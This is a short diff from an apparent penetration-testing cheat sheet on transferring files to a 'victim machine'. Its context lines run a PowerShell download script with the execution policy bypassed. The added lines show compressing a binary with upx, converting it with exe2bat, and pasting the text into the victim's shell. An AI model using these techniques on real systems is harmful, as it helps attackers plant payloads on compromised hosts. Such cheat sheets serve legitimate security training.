@@ -253,6 +253,23 @@ On victim machine shell:
 	echo $webclient.DownloadFile($url,$file) >> wget.ps1
 	
 	powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+	
+<b>Debug.exe utility</b> (In Windows 32bit OS - Works only for file < 64Kb)
+
+On attacker machine:
+
+	cp <[FILE]> .
+
+	upx -9 <[FILE]> (for compression)
+	
+	cp <[FILE]> .
+	
+	wine exe2bat <[FILE]> <[FILE.txt]>
+
+On victim machine:
+
+	Paste the content of <[FILE.txt]>
+
 
 
 
